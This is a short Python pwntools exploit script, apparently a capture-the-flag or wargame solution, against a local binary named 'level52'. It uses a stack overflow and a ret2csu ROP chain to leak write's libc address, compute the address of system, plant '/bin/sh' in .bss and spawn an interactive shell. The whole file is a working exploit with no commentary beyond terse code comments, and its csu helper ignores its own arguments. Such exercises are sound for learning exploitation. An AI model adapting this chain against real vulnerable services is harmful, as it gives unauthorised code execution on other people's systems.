from pwn import*

p = process('./level52')
elf = ELF('./level52')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

write_got = elf.got['write']
write_plt = elf.symbols['write']
read_got = elf.got['read']
read_plt = elf.symbols['read']
bss = elf.bss()
start = 0x40061a
end = 0x400600
main = elf.symbols['main']

junk = 'a'*(0x80+8)
fakeebp = 'a'*8

def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 136
    payload += p64(0x40061a) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)
    payload += p64(0x400600)
    payload += 'a' * 0x38
    payload += p64(main)
    p.send(payload)
    sleep(1)

print "*************leak write_add**********"
write_lib = libc.symbols['write']
print "write_lib --> [%s] "%write_lib

p.recvuntil("Hello, World\n")
csu(0,1,write_got,8,write_got,1,main)

write_add = u64(p.recv(8))
print "write_add --> [%s]" %hex(write_add)

lib_base = write_add - write_lib
print "libc base --> [%s]" %hex(lib_base)
system_add = lib_base + libc.symbols['system'] # system can not work up
print "system_add --> [%s]" %hex(system_add)


print "************write address and \'\bin\sh'\'***************"
payload = junk + p64(start) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss) + p64(0)
payload += p64(end)
payload += 'a'*0x38
payload +=p64(main)


p.recvuntil('Hello, World\n')
p.send(payload)
sleep(1)
# pwnlib.gdb.attach(p)
# pause()
p.send(p64(system_add)+'/bin/sh\x00')
sleep(1)

payload = junk + p64(start)
payload += p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(bss+8)
payload += p64(end)
payload += 'a'*0x38
payload +=p64(main)
p.recvuntil('Hello, World\n')
sleep(1)
p.send(payload)

p.interactive()